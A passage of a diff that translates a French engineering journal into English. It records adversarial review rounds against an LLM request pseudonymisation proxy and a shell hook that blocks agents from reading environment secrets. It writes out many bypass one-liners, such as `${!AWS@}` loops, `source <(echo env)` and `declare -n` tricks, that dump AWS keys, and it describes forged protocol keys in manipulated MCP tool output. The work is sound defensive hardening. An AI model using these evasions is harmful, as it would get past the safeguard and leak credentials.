+environment table (System.getenv()) got through on a machine where it is
+installed.
 
-**Zéro faux positif mesuré** sur les mêmes mécanismes en usage normal
+**Zero false positive measured** on the same mechanisms in normal use
 (`trap 'rm -f /tmp/lock' EXIT`, `case $1 in build)…`, `mapfile -t`,
 `python3 -X dev script.py`, `alias ll='ls -la'`).
 
-## Treizième revue adversariale (2026-08-04, round 12)
+## Round 12 (2026-08-04)
 
-### Walker — toute clé de protocole était recopiée SANS CONDITION
-`name` et `id` avaient été cadrés au round 4 ; les huit autres, jamais. Un
-tiers — serveur MCP, sortie d'outil manipulée — plaçait
-`{"type": "text", "role": "<hôte réel>"}` dans son sous-arbre et la valeur
-sortait verbatim. Pire : le caractère « protocolaire » d'un nœud se DÉDUISAIT
-de son propre `type`, si bien qu'écrire `{"type": "tool_use", "name": …}`
-suffisait à obtenir la protection — la même forgerie que l'opacité, aux mêmes
-endroits, non corrigée en même temps.
+### Walker — every protocol key was copied UNCONDITIONALLY
+`name` and `id` had been scoped in round 4; the other eight, never. A third
+party — MCP server, manipulated tool output — could place
+`{"type": "text", "role": "<real host>"}` in its subtree and the value went out
+verbatim. Worse: a node's "protocol" character was INFERRED from its own
+`type`, so writing `{"type": "tool_use", "name": …}` was enough to obtain the
+protection — the same forgery as opacity, in the same places, not fixed at the
+same time.
 
-Règle unifiée : **une clé de protocole est gardée soit par sa POSITION, soit
-par la FORME de sa valeur, jamais recopiée sans condition.**
-`type`, `role`, `stop_reason`, `model`, `media_type` ont un vocabulaire fermé
-(`SCALAR_SKIP_FORMS`) — un nom d'hôte n'a jamais l'air d'un rôle. `name`, `id`,
-`tool_use_id` exigent une position : un bloc DIRECTEMENT sous le `content` d'un
-message, et le type attendu pour cette clé. `signature` sort de la liste : sa
-seule position légitime est un bloc signé, rendu verbatim bien avant la boucle.
+Unified rule: **a protocol key is guarded either by its POSITION or by the
+SHAPE of its value, never copied unconditionally.** `type`, `role`,
+`stop_reason`, `model`, `media_type` have a closed vocabulary
+(`SCALAR_SKIP_FORMS`) — a hostname never looks like a role. `name`, `id`,
+`tool_use_id` require a position: a block DIRECTLY under a message's `content`,
+and the type expected for that key. `signature` leaves the list: its only
+legitimate position is a signed block, rendered verbatim well before the loop.
 
-### Walker — un document texte encodé partait ENTIER
-`type: "base64"` dit comment la charge est ENCODÉE, pas ce qu'elle contient.
-Le prendre pour une preuve de binarité faisait recopier verbatim tout document
-texte : coller un JSON ou un YAML dans un prompt — le geste le plus ordinaire —
-envoyait le fichier complet. Seul le `media_type` fait foi désormais, et une
-charge texte est DÉCODÉE, pseudonymisée, ré-encodée. Ce qui ne se décode pas en
-UTF-8 est binaire malgré son en-tête et reste intact.
+### Walker — an encoded text document went out WHOLE
+`type: "base64"` says how the payload is ENCODED, not what it contains. Taking
+it as proof of binarity meant copying any text document verbatim: pasting JSON
+or YAML into a prompt — the most ordinary gesture there is — sent the whole
+file. Only `media_type` is authoritative now, and a text payload is DECODED,
+pseudonymised, re-encoded. What does not decode as UTF-8 is binary despite its
+header and stays intact.
 
-### Allowlist — un hôte à deux labels tient dans un segment « un point »
-Le round 11 avait borné les chemins à « un mot ou un nom de fichier ». Or
-`acme.internal` a exactement la forme d'`index.html`. Un segment de chemin ne
-porte plus AUCUN point. Prix assumé : un nom de fichier dans une URL de
-documentation est substitué — abîmer une URL est visible et cosmétique, laisser
-sortir un hôte interne ne l'est pas.
+### Allowlist — a two-label host fits in a "one dot" segment
+Round 11 bounded paths to "a word or a filename". But `acme.internal` has
+exactly the shape of `index.html`. A path segment now carries NO dot at all.
+Accepted price: a filename inside a documentation URL gets substituted —
+damaging a URL is visible and cosmetic, letting an internal host out is not.
 
-### Hook — sept mécanismes, dont deux régressions de mes correctifs du round 11
-- **Une sous-commande portée par un ARGUMENT** (`trap -- 'env' EXIT`,
-  `mapfile -C 'sh -c env'`) : mes isolations du round 11 ne retenaient que le
-  PREMIER token. Elle est désormais analysée récursivement, et les DEUX
-  lectures sont émises — un mot, ou tout le reste : le quoting étant retiré, on
-  ne sait pas où elle s'arrête. Les spécifications de signal, vocabulaire
-  fermé, sont retirées de la queue d'un `trap`.
-- **Une expansion peut valoir le VIDE** : `${IFS//?/}` remplace tout par rien,
-  `${V:0:0}` est une tranche nulle. Les caractères autour se recollent et
-  reconstruisent le nom. Je réduisais IFS à une ESPACE, ce qui ne couvre que la
-  forme valant un séparateur. Plutôt qu'énumérer les formes provablement vides,
-  la lecture « tout est vide » est émise et analysée comme une commande.
-- **Le nom d'une variable arrive indirectement** : `x=$y`, `x=$(…)`,
-  `read x <<<`, `printf -v x`, `declare -n r` puis `r=…`. L'index n'admettait
-  qu'un littéral en membre droit. La chaîne est suivie, bornée ; une source
-  opaque vaut refus (fail-closed).
-- **Enveloppes de bac à sable** (`bwrap`, `gdb`, `setpriv`, `firejail`,
-  `valgrind`) : leurs options prennent un nombre VARIABLE de valeurs —
-  `bwrap --dev-bind SRC DST` — donc aucune grammaire d'options ne tient. Tous
-  les mots suivants deviennent des positions de programme possibles.
-  Sur-approximation assumée : ces enveloppes sont rares.
-- **`env # commentaire`** : bash coupe la ligne au dièse, mais le hook lisait
-  le commentaire comme le programme exécuté par `env`, donc comme un préfixe
-  légitime.
-- **Options courtes combinées** (`declare -px`), `typeset` alias de `declare`,
-  `exec -a NOM cmd` (l'argv[0] occupait la position de programme),
-  `script -c CMD`, et `PROMPT_COMMAND` / `command_not_found_handle`, qui
-  portent une commande et non une donnée.
+### Hook — seven mechanisms, two of them regressions of my round-11 fixes
+- **A sub-command carried by an ARGUMENT** (`trap -- 'env' EXIT`,
+  `mapfile -C 'sh -c env'`): my round-11 isolations kept only the FIRST token.
+  It is now analysed recursively, and BOTH readings are emitted — one word, or
+  all the rest: quoting having been removed, we do not know where it ends.
+  Signal specifications, a closed vocabulary, are stripped from a `trap` tail.
+- **An expansion can evaluate to EMPTY**: `${IFS//?/}` replaces everything with
+  nothing, `${V:0:0}` is a null slice. The surrounding characters then rejoin
+  and rebuild the name. I reduced IFS to a SPACE, which only covers the form
+  that evaluates to a separator. Rather than enumerating provably empty forms,
+  the "everything is empty" reading is emitted and analysed as a command.
+- **A variable name arrives indirectly**: `x=$y`, `x=$(…)`, `read x <<<`,
+  `printf -v x`, `declare -n r` then `r=…`. The index only accepted a literal
+  on the right-hand side. The chain is now followed, bounded; an opaque source
+  means refusal (fail-closed).
+- **Sandbox wrappers** (`bwrap`, `gdb`, `setpriv`, `firejail`, `valgrind`):
+  their options take a VARIABLE number of values — `bwrap --dev-bind SRC DST` —
+  so no option grammar holds. Every following word becomes a possible program
+  position. Accepted over-approximation: those wrappers are rare.
+- **`env # comment`**: bash cuts the line at the hash, but the hook read the
+  comment as the program executed by `env`, hence as a legitimate prefix.
+- **Combined short options** (`declare -px`), `typeset` as an alias of
+  `declare`, `exec -a NAME cmd` (argv[0] occupied the program position),
+  `script -c CMD`, and `PROMPT_COMMAND` / `command_not_found_handle`, which
+  carry a command and not data.
 
-**Zéro faux positif mesuré** sur douze idiomes courants ; disponibilité
-inchangée malgré la double lecture (500 Ko de texte en 0,80 s).
+**Zero false positives measured** across twelve common idioms; availability
+unchanged despite the double reading (500 KB of text in 0.80 s).
 
-## Quatorzième revue adversariale (2026-08-04, round 13 — hook)
+## Round 13 (2026-08-04) — hook
 
-**Les deux agents sont d'abord morts d'un « stream idle timeout » sans rien
-rendre.** Demander « un rapport partiel tôt » ne suffit pas : la consigne qui
-marche est un rendu par LOTS NUMÉROTÉS, une synthèse écrite après chacun, six
-au maximum. Noté dans `REPRISE.md` — c'est la deuxième fois que ce mode
-d'échec coûte un round.
+**Both agents first died of a stream idle timeout returning nothing.** Asking
+for "an early partial report" is not enough: the instruction that works is
+delivery in NUMBERED BATCHES, with a written synthesis after each, six at most.
+Noted in `REPRISE.md` — that is the second time this failure mode has cost a
+round.
 
-**L'inversion de la charge de la preuve sur l'indirection.** Quatre des sept
-findings partageaient une racine : `${!x}` lit la variable NOMMÉE par la valeur
-de `x`, et cette valeur peut venir d'une boucle `for`, d'un `select`, d'un
-paramètre positionnel, d'un `set --`, d'un argument de fonction, d'un `read`
-attaché au bloc englobant. J'énumérais ces mécanismes depuis trois rounds et il
-en sortait de nouveaux à chaque fois. Désormais **on refuse à moins de
-DÉMONTRER que le nom lu est anodin** : la liste des indirections inoffensives
-est courte et bornable (`${!arr[@]}`, qui rend des indices), celle des
-dangereuses ne l'est pas. Cela ferme d'un coup `for`, `select`, `${!1}`,
-`${!*}`, `set --`, les arguments de fonction, `while read … done <<<`, et la
-chaîne de trente sauts qui dépassait ma borne d'itérations.
+**Inverting the burden of proof on indirection.** Four of the seven findings
+shared a root: `${!x}` reads the variable NAMED by the value of `x`, and that
+value can come from a `for` loop, a `select`, a positional parameter, a
+`set --`, a function argument, a `read` attached to the enclosing block. I had
+been enumerating those mechanisms for three rounds and new ones kept appearing.
+From now on **we refuse unless we can DEMONSTRATE that the name read is
+harmless**: the list of harmless indirections is short and boundable
+(`${!arr[@]}`, which yields indices), the dangerous one is not. That closes in
+one go `for`, `select`, `${!1}`, `${!*}`, `set --`, function arguments,
+`while read … done <<<`, and the thirty-hop chain that exceeded my iteration
+bound.
 
-Autres correctifs :
-- **`source <(echo env)` et `. <(…)`** exécutent le CONTENU de leur argument.
-  `source` et `.` n'étaient ni enveloppes ni interpréteurs : leur argument
-  n'était jamais traité comme du code. Ajoutés aux enveloppes — le marqueur
-  d'une substitution s'y retrouve en position de programme et la commande est
-  refusée, tandis qu'un chemin littéral reste sourçable.
-- **Un paramètre POSITIONNEL ou SPÉCIAL peut désigner le programme** :
-  `f() { $1; }; f env`. Mon correctif du round 9 couvrait `$LETTRE`, pas `$1`,
-  `$@`, `$*`.
-- **`fc -l`** lit le même historique que `history`, déjà refusé.
+Other fixes:
+- **`source <(echo env)` and `. <(…)`** execute the CONTENT of their argument.
+  `source` and `.` were neither wrappers nor interpreters: their argument was
+  never treated as code. Added to the wrappers — the substitution marker then
+  lands in program position and the command is refused, while a literal path
+  stays sourceable.
+- **A POSITIONAL or SPECIAL parameter can name the program**: `f() { $1; }; f
+  env`. My round-9 fix covered `$LETTER`, not `$1`, `$@`, `$*`.
+- **`fc -l`** reads the same command record as `history`, already refused.
 
-**Faux positif introduit puis corrigé, deux fois de suite sur moi-même** : une
-REGEX citant la syntaxe d'indirection était prise pour une indirection, ce qui
-rendait ce hook impossible à écrire. L'expansion doit être BIEN FORMÉE —
-accolade fermante proche, aucun métacaractère entre les deux. Et
-`${!arr[@]}` échappait à mon exclusion parce que la normalisation des classes
-de glob le réduit à `${!arr@}`.
+**False positive introduced then fixed, twice over on myself**: a REGEX quoting
+the indirection syntax was taken for an indirection, which made this very hook
+impossible to write. The expansion must be WELL FORMED — closing brace nearby,
+no metacharacters between. And `${!arr[@]}` escaped my exclusion because glob
+class normalisation reduced it to `${!arr@}`.
 
-### Walker — round 13 : mon correctif du base64 ne couvrait qu'un cas sur deux
-- **Seul l'UTF-8 était pseudonymisé.** Un CSV Windows en UTF-16, un log
-  latin-1, un export CJK repartaient VERBATIM : `_base64_texte` rendait la
-  charge inchangée dès que le décodage UTF-8 échouait. Le décodage essaie
-  maintenant plusieurs jeux, dans un ordre décidé par la marque d'ordre des
-  octets et la densité de zéros — décoder de l'ASCII en UTF-16 donne des
-  idéogrammes, et l'inverse casse le texte. Un zéro dans le résultat signe un
-  mauvais décodage : le vrai texte n'en a pas.
-- **La charge n'était regardée que sous `type: "base64"`.** Un serveur MCP la
-  place sous `resource`, `text` ou ce qu'il veut, et elle sortait entière. Le
-  base64 est du base64 quel que soit le type du bloc.
+### Walker — round 13: my base64 fix covered one case out of two
+- **Only UTF-8 was pseudonymised.** A Windows CSV in UTF-16, a latin-1 log, a
+  CJK export went out VERBATIM: the decoder returned the payload unchanged as
+  soon as UTF-8 decoding failed. Decoding now tries several charsets, in an
+  order decided by the byte-order mark and by zero density — decoding ASCII as
+  UTF-16 yields ideograms, and the reverse breaks the text. A zero in the
+  result signals a wrong decode: real text has none.
+- **The payload was only examined under `type: "base64"`.** An MCP server puts
+  it under `resource`, `text` or whatever it likes, and it went out whole.
+  base64 is base64 whatever the block type says.
 
-**Routage — deux divergences qui font refuser la requête** : un
-`web_search_tool_result` et un `code_execution_tool_result` portent eux aussi
-un `tool_use_id`, absent de ma table ; il était donc substitué alors que le
-`server_tool_use.id` correspondant restait verbatim. Et `mcp_tool_use.server_name`
-désigne l'entrée `mcp_servers[].name`, qui reste verbatim (clé de routage) :
-le substituer cassait la correspondance en silence. Un test existant affirmait
-l'inverse — il encodait le comportement incohérent, il est corrigé.
+**Routing — two divergences that make the request fail**: a
+`web_search_tool_result` and a `code_execution_tool_result` also carry a
+`tool_use_id`, absent from my table; it was therefore substituted while the
+matching `server_tool_use.id` stayed verbatim. And `mcp_tool_use.server_name`
+designates the `mcp_servers[].name` entry, which stays verbatim (routing key):
+substituting it broke the correspondence silently. An existing test asserted
+the opposite — it encoded the inconsistent behaviour, and it is corrected.
 
-**Vocabulaires fermés trop larges** : `command` et `titan` sont des mots
-anglais, si bien que `commander-billing-prod-01` et `TITAN-CORP-VAULT`
-passaient pour des noms de modèle (et l'insensibilité à la casse élargissait
-encore) — seul `claude` circule sur ce canal. Un `type` à segment purement
-numérique (`srv_billing_01`) est une convention de nom d'hôte, pas un type de
-bloc. Et le type de premier niveau d'un média est un registre FERMÉ : sans
-lui, `srv-billing-prod-01/acme-internal` en avait la forme.
-Élargi dans l'autre sens au passage, pour ne pas casser des valeurs réelles :
-`role=developer|tool`, `stop_reason=content_filter|length`, et les paramètres
-RFC 6838 (`text/plain; charset=utf-8`), que ma forme refusait.
+**Closed vocabularies that were too wide**: `command` and `titan` are English
+words, so `commander-billing-prod-01` and `TITAN-CORP-VAULT` passed as model
+names (and case-insensitivity widened it further) — only `claude` travels on
+this channel. A `type` with a purely numeric segment (`srv_billing_01`) is a
+hostname convention, not a block type. And a media type's top level is a CLOSED
+registry: without it, `srv-billing-prod-01/acme-internal` had the shape.
+Widened in the other direction at the same time, so as not to break real
+values: `role=developer|tool`, `stop_reason=content_filter|length`, and
+RFC 6838 parameters (`text/plain; charset=utf-8`), which my shape refused.
 
-**`id` de message** : `dans_messages` suffisait à le rendre verbatim, donc un
-`{"role": "user", "id": "<hôte réel>"}` forgé sortait. Un message ne porte ni
-`name` ni `id` dans une requête.
+**Message `id`**: being inside `messages` alone made it verbatim, so a forged
+`{"role": "user", "id": "<real host>"}` went out. A message carries neither
+`name` nor `id` in a request.
 
-**Résidu assumé** : un `type` en minuscules dont aucun segment n'est numérique
-(`db_master_prod`) reste indiscernable d'un type de bloc. Même limite que
-partout ailleurs — c'est une question d'inventaire, pas de forme.
+**Accepted residual**: a lowercase `type` with no numeric segment
+(`db_master_prod`) stays indistinguishable from a block type. Same limit as
+everywhere else — a question of inventory, not of shape.
 
-## Quinzième revue adversariale (2026-08-05, round 14)
+## Round 14 (2026-08-05)
 
-Les deux moitiés ont trouvé la MÊME chose : mes correctifs de la veille avaient
-durci une branche et laissé sa jumelle intacte.
+Both halves found the SAME thing: my fixes from the day before had hardened one
+branch and left its twin untouched.
 
-### Hook — l'inversion ne couvrait qu'une des deux branches
-J'avais rendu `${!x}` fail-closed, mais `declare -n r=CIBLE` lisait la cible
-DIRECTEMENT — ce qui est juste quand elle est écrite en clair, et faux quand
-elle vient d'un paramètre positionnel : `f() { declare -n r=$1; }; f AWS_…`
-déclarait la cible anodine faute d'affectation visible. Une cible qui n'est
-pas un identifiant littéral exige désormais la même preuve que l'indirection.
+### Hook — the inversion covered only one of two branches
+I had made `${!x}` fail-closed, but `declare -n r=TARGET` read the target
+DIRECTLY — which is right when it is written in clear, and wrong when it comes
+from a positional parameter: `f() { declare -n r=$1; }; f AWS_…` declared the
+target harmless for want of a visible assignment. A target that is not a
+literal identifier now requires the same proof as indirection.
 
-**Le marqueur de substitution était ENTOURÉ d'espaces.** `A=x $V` (deux mots,
-le second est le programme) devenait donc indistinguable de `A=x$V` (un seul
-mot, une valeur d'affectation) — et l'exception faite au round 8 pour la
-seconde couvrait la première, qui exécute bel et bien. Le marqueur reste
-COLLÉ là où la substitution l'était ; l'exception disparaît d'elle-même, et
-l'opacité se teste par inclusion et non par égalité.
+**The substitution marker was SURROUNDED by spaces.** `A=x $V` (two words, the
+second is the program) therefore became indistinguishable from `A=x$V` (one
+word, an assignment value) — and the exception made in round 8 for the second
+covered the first, which does execute. The marker now stays GLUED where the
+substitution was; the exception disappears by itself, and opacity is tested by
+containment rather than equality.
 
-**`${VAR@P}` interprète le prompt, donc EXÉCUTE** les substitutions que la
-variable contient. Deux étages manquaient : ma normalisation réduisait
-`${X@P}` à `$X`, faisant disparaître l'opérateur avant qu'aucun motif ne
-puisse le voir ; et `printf -v PS1` reconstruisait le `$` par `\x24`, hors de
-portée du motif PS0/PS4.
+**`${VAR@P}` interprets the prompt, therefore EXECUTES** the substitutions the
+variable contains. Two levels were missing: my normalisation reduced `${X@P}`
+to `$X`, making the operator vanish before any pattern could see it; and
+`printf -v PS1` rebuilt the `$` via `\x24`, out of reach of the PS0/PS4
+pattern.
 
-**L'arithmétique lit une variable SANS dollar** : `echo $((AWS_SECRET…))`, et
-le contrôle des noms exigeait le sigil.
+**Arithmetic reads a variable WITHOUT a dollar**: `echo $((AWS_SECRET…))`,
+while the name control required the sigil.
 
-Quatre faux positifs corrigés : `declare -pF` (le `-F` porte sur les
-FONCTIONS, aucune valeur n'est listée) · une regex citant `\${!x}` — `\$` est
-un dollar LITTÉRAL, le réduire à `$` en faisait une vraie indirection ·
-`${!ARR[@]}` où le tableau porte un nom sensible (seuls les INDICES sortent) ·
-une substitution de processus en ÉCRITURE (`> >(tee log)`), qui désigne une
-destination et non un programme.
+Four false positives fixed: `declare -pF` (the `-F` is about FUNCTIONS, no
+value is listed) · a regex quoting `\${!x}` — `\$` is a LITERAL dollar, so
+reducing it to `$` made it a real indirection · `${!ARR[@]}` where the array
+carries a sensitive name (only INDICES come out) · a process substitution in
+WRITE mode (`> >(tee log)`), which names a destination and not a program.
 
-### Walker — j'avais fermé le premier niveau et laissé le sous-type ouvert
-`SCALAR_SKIP_FORMS["media_type"]` épinglait le registre de PREMIER niveau
-(round 13) mais laissait le sous-type accepter les points :
-`text/db-01.acme.internal` en avait la forme et sortait verbatim, sans entrée
-de coffre ni substitut non résolu. Sous-type sans point, arbres `vnd.`/`prs.`
-bornés, `x-` explicite ; les dix types réels testés restent intacts, y compris
+### Walker — I had closed the first level and left the sub-type open
+`SCALAR_SKIP_FORMS["media_type"]` pinned the top-level registry (round 13) but
+left the sub-type accepting dots: `text/db-01.acme.internal` had the shape and
+went out verbatim, with no vault entry and no unresolved surrogate. Sub-type
+without a dot, bounded `vnd.`/`prs.` trees, explicit `x-`; the ten real types
+tested stay intact, including
 `application/vnd.openxmlformats-officedocument.wordprocessingml.document`.
 
-Deux pannes en attente : le protocole MCP écrit **`mimeType`** (camelCase), que
-je ne lisais pas — une petite charge binaire y était prise pour du texte, donc
-décodée, substituée et ré-encodée, c'est-à-dire CORROMPUE. Et
-`container_upload.file_id` désigne un fichier DÉJÀ téléversé : le substituer
-donne un identifiant qui ne correspond à rien.
+Two breakages waiting to happen: the MCP protocol writes **`mimeType`**
+(camelCase), which I did not read — a small binary payload there was taken for
+text, so decoded, substituted and re-encoded, i.e. CORRUPTED. And
+`container_upload.file_id` designates an ALREADY uploaded file: substituting it
+yields an identifier matching nothing.
 
-**Résidu assumé** : un arbre vendeur est pointé PAR NATURE
-(`application/vnd.acme.db-01.acme.internal+json`). Le distinguer demanderait
-de savoir que `acme` est à nous — question d'INVENTAIRE, pas de forme. Même
-arbitrage que les paquets sous un préfixe tiers.
+**Accepted residual**: a vendor tree is dotted BY NATURE
+(`application/vnd.acme.db-01.acme.internal+json`). Telling them apart would
+require knowing that `acme` is ours — a question of INVENTORY, not of shape.
+Same arbitration as packages under a third-party prefix.
 
-**Coffre et concurrence, aucun finding** : isolation entre portées, persistance
-après réouverture, fail-closed sur mauvaise clé, injectivité sur 50 fils et
-50 valeurs, déterminisme entre processus, 4000 valeurs sans épuisement. D1 et
-D6 tiennent — c'est la première fois qu'ils étaient attaqués sous cet angle.
+**Vault and concurrency, no findings**: isolation between scopes, persistence
+after reopening, fail-closed on a wrong key, injectivity across 50 threads and
+50 values, determinism across processes, 4000 values without exhaustion. D1 and
+D6 hold — the first time they had been attacked from that angle.
 
-## Seizième revue adversariale (2026-08-05, round 15)
+## Round 15 (2026-08-05)
 
-**Première moitié à atteindre le critère d'arrêt.** L'agent walker/moteur
-déclare explicitement n'avoir trouvé AUCUN finding critique ni haut, après
-avoir attaqué le proxy, le service de détection, les surfaces exotiques de
-l'API et le moteur. Le hook, lui, en a rendu trois plus un déni de service.
+**First half to reach the stopping criterion.** The walker/engine agent
+explicitly reports NO critical or high finding, after attacking the proxy, the
+detection service, the exotic API surfaces and the engine. The hook produced
+three, plus a denial of service.
 
-### Hook — mon exemption d'hier a ouvert une fuite
-`${!arr[@]}` rend les INDICES d'un tableau ; `${!PREFIX@}`, **sans crochets**,
-ÉNUMÈRE LES NOMS des variables commençant par PREFIX — c'est-à-dire la liste
-des secrets présents dans l'environnement. Ma normalisation réduisait `[@]` à
-`@` (règle anti-glob), les deux formes devenaient identiques, et j'avais élargi
-l'exemption pour rattraper le faux positif que cela créait. `A=x; for A in
-${!AWS@}; do echo ${!A}; done` déversait donc les clés AWS. Les crochets sont
-désormais préservés par la normalisation et EXIGÉS par l'exemption.
+### Hook — yesterday's exemption opened a leak
+`${!arr[@]}` yields an array's INDICES; `${!PREFIX@}`, **without brackets**,
+ENUMERATES THE NAMES of variables starting with PREFIX — that is, the list of
+secrets present in the environment. My normalisation reduced `[@]` to `@`
+(anti-glob rule), the two forms became identical, and I had widened the
+exemption to catch the false positive that created. `A=x; for A in ${!AWS@}; do
+echo ${!A}; done` therefore dumped the AWS keys. Brackets are now preserved by
+normalisation and REQUIRED by the exemption.
 
-**Une variable LIÉE à l'exécution est aussi inconnue qu'une indirection.**
-`for VAR in`, `select VAR in`, `while read VAR … done <<< …`, `read -u FD VAR`,
-`getopts SPEC VAR` : cinq mécanismes tombés l'un après l'autre. Plutôt que de
-continuer à les énumérer — la leçon du round 13 — la variable liée est marquée
-OPAQUE, et la preuve qu'exige l'indirection échoue d'elle-même.
+**A variable BOUND at runtime is as unknown as an indirection.** `for VAR in`,
+`select VAR in`, `while read VAR … done <<< …`, `read -u FD VAR`,
+`getopts SPEC VAR`: five mechanisms falling one after another. Rather than keep
+enumerating them — the round-13 lesson — the bound variable is marked OPAQUE,
+and the proof indirection requires fails by itself.
 
-**`readonly -p` imprime les valeurs**, comme `declare -p`, et n'était pas dans
-la liste des déverseurs. La logique de ces builtins est reprise entière : une
-variable NOMMÉE fait décider par son nom, une AFFECTATION n'imprime rien, et
-sans argument nommé ils DÉVERSENT (`readonly -a` liste les tableaux avec leurs
-valeurs).
+**`readonly -p` prints values**, like `declare -p`, and was not in the dumper
+list. The logic of those builtins is taken over wholesale: a NAMED variable
+means the name decides, an ASSIGNMENT prints nothing, and with no named
+argument they DUMP (`readonly -a` lists arrays with their values).
 
-**Déni de service** : mon budget d'expansion d'accolades comptait les
-ALTERNATIVES, pas la TAILLE du texte produit. Onze alternatives sur cent
-groupes y tenaient largement tout en produisant des mégaoctets, dont la
-relecture gelait l'agent **vingt secondes par appel d'outil**. Budget en
-caractères ajouté : 0,76 s.
+**Denial of service**: my brace-expansion budget counted ALTERNATIVES, not the
+SIZE of the produced text. Eleven alternatives across a hundred groups fitted
+the budget comfortably while producing megabytes, whose re-reading froze the
+agent **twenty seconds per tool call**. Character budget added: 0.76 s.
 
-### Moteur — deux manquements à D1, sans effet sur la protection
-Aucune valeur réelle ne sortait ; le modèle recevait simplement une référence
-qu'il ne pouvait plus lire, ce qui est un manquement à D1 (« substituts
-plausibles »).
-- **L'allowlist était sensible à la casse.** `GitHub.com/spf13/cobra` et
-  `LOCALHOST` étaient substitués alors que `github.com/spf13/cobra` et
-  `localhost` sont publics : rien n'était protégé, et le modèle perdait la
-  référence. Une entrée écrite TOUT EN MINUSCULES désigne un identifiant
-  insensible à la casse ; une entrée qui porte une majuscule l'a VOULUE
-  (`Mail.Read` est une permission, pas un mot). La casse de l'entrée déclare
-  elle-même si la casse compte — rien à classifier à la main. Règle dupliquée
-  des deux côtés de la frontière D7, comme le parseur.
-- **Un schéma sans `//` ne porte pas d'autorité.** L'arobase d'un `mailto:`
-  sépare le local du domaine : le prendre pour un userinfo faisait disparaître
-  le schéma ET le local, et le modèle recevait un nom d'hôte là où il y avait
-  une adresse. Idem `data:`, et un dépôt AUTO-HÉBERGÉ retombait sur un simple
-  MOT, que le modèle ne peut ni cloner ni lire comme une URL.
+### Engine — two D1 breaches, with no effect on protection
+No real value was leaving; the model simply received a reference it could no
+longer read, which breaches D1 ("plausible surrogates").
+- **The allowlist was case-sensitive.** `GitHub.com/spf13/cobra` and
+  `LOCALHOST` were substituted while `github.com/spf13/cobra` and `localhost`
+  are public: nothing was protected, and the model lost the reference. An entry
+  written ALL LOWERCASE denotes a case-insensitive identifier; an entry
+  carrying a capital MEANT it (`Mail.Read` is a permission, not a word). The
+  entry's own casing declares whether case matters — nothing to classify by
+  hand. Rule duplicated on both sides of the D7 boundary, like the parser.
+- **A scheme with no `//` carries no authority.** A `mailto:` at-sign separates
+  the local part from the domain: taking it for userinfo made the scheme AND
+  the local part disappear, and the model received a hostname where there was
+  an address. Same for `data:`, and a SELF-HOSTED repository fell back to a
+  plain WORD, which the model can neither clone nor read as a URL.
 
-## Dix-septième revue adversariale (2026-08-05, round 16 — hook)
+## Round 16 (2026-08-05) — hook
 
-**Un seul finding, et il tombe pile dans les deux motifs que j'avais demandé
-de chercher.** J'avais durci SÉPARÉMENT, au round précédent, l'exemption des
-indices de tableau (`${!arr[@]}`, qui exige désormais les crochets) et la
-détection d'indirection (`${!nom}`, dont la classe excluait le crochet
-ouvrant). Entre les deux, `${!m[k1]}` n'était couvert par AUCUNE des deux —
-alors que c'est une indirection à part entière : la VALEUR de l'élément nomme
-la cible, et bash la suit. Six formes d'indice vérifiées, toutes ouvertes.
+**A single finding, and it lands squarely in the two patterns I had asked to be
+looked for.** In the previous round I had SEPARATELY hardened the array-index
+exemption (`${!arr[@]}`, which now requires brackets) and indirection detection
+(`${!name}`, whose class excluded the opening bracket). Between the two,
+`${!m[k1]}` was covered by NEITHER — although it is a full indirection: the
+element's VALUE names the target, and bash follows it. Six subscript forms
+checked, all open.
 
-C'est le motif de la JUMELLE et celui de l'EXEMPTION QUI DÉBORDE combinés :
-deux gardes voisines durcies chacune de son côté laissent un trou au milieu.
-Nommer ces motifs dans la consigne de l'agent est ce qui l'a fait chercher là.
+It is the TWIN pattern and the OVERFLOWING EXEMPTION combined: two neighbouring
+guards, each hardened on its own, leave a hole in the middle. Naming those
+patterns in the agent's instructions is what made it look there.
 
-Disponibilité et faux positifs : RAS sur 78 commandes DevOps et sur des
-entrées de 25 000 caractères (45 ms).
+Availability and false positives: nothing to report across 78 DevOps commands
+and 25,000-character inputs (45 ms).
 
-**Faux positif ajouté à la liste des assumés** : citer la syntaxe
-d'indirection dans une chaîne (`echo 'la syntaxe est ${!x}'`) est refusé. Le
-quoting est retiré par la normalisation anti-obfuscation, donc une citation
-devient indistinguable d'une expansion réelle. Blanchir les régions entre
-apostrophes serait FAUX — `bash -c '${!x}'` les fait bien exécuter. Le refus
-est visible et contournable (heredoc cité, chaîne scindée), là où l'inverse
-serait silencieux.
+**False positive added to the accepted list**: quoting the indirection syntax
+inside a string (`echo 'the syntax is ${!x}'`) is refused. Quoting is removed
+by the anti-obfuscation normalisation, so a quotation becomes indistinguishable
+from a real expansion. Whitelisting regions between single quotes would be
+WRONG — `bash -c '${!x}'` does execute them. The refusal is visible and can be
+worked around (quoted heredoc, split string), whereas the opposite would be
+silent.
 
-### Moteur — round 16 : DEUXIÈME round propre d'affilée
-Aucun finding critique ni haut, après avoir attaqué en priorité la règle qui
-vient d'ÉLARGIR le public (l'insensibilité à la casse), les URI sans autorité,
-le proxy, le détecteur, le walker et le moteur.
+### Engine — round 16: SECOND clean round in a row
+No critical or high finding, after attacking as a priority the rule that had
+just WIDENED what is public (case-insensitivity), authority-less URIs, the
+proxy, the detector, the walker and the engine.
 
-**La question laissée ouverte a sa réponse** : le proxy EST fail-closed quand
-le détecteur est indisponible — `DetectionUnavailable` remonte jusqu'au 503,
-vérifié aussi sur un port fermé. Nuance documentée : un texte DÉJÀ pseudonymisé
-continue d'être servi par le cache pendant l'indisponibilité ; seul un texte
-nouveau tombe en 503.
+**The open question has its answer**: the proxy IS fail-closed when the
+detector is unavailable — `DetectionUnavailable` propagates to a 503, verified
+against a closed port too. Documented nuance: text ALREADY pseudonymised keeps
+being served from cache during the outage; only new text yields a 503.
 
-**Un manquement à D1 corrigé** : le préfixe d'algorithme d'une empreinte
-(`sha3-256:`, `SHA-256:`, `blake2b:`, `keccak256:`, `xxh64:`) était PERDU —
-l'opérateur voyait un hexadécimal nu sans savoir à quoi il avait affaire. Le
-registre reste FERMÉ, et c'est essentiel : une forme libre conserverait
-`srv-billing-01:deadbeef`, donc ferait fuir la partie avant le deux-points.
-Deux tests figent les deux côtés.
+**One D1 breach fixed**: a digest's algorithm prefix (`sha3-256:`, `SHA-256:`,
+`blake2b:`, `keccak256:`, `xxh64:`) was LOST — the operator saw bare hex with
+no idea what they were looking at. The registry stays CLOSED, and that is
+essential: a free form would preserve `srv-billing-01:deadbeef`, hence leak the
+part before the colon. Two tests pin both sides.
 
-**Limite mesurée, assumée** : un schéma d'URI NON reconnu qui porte une
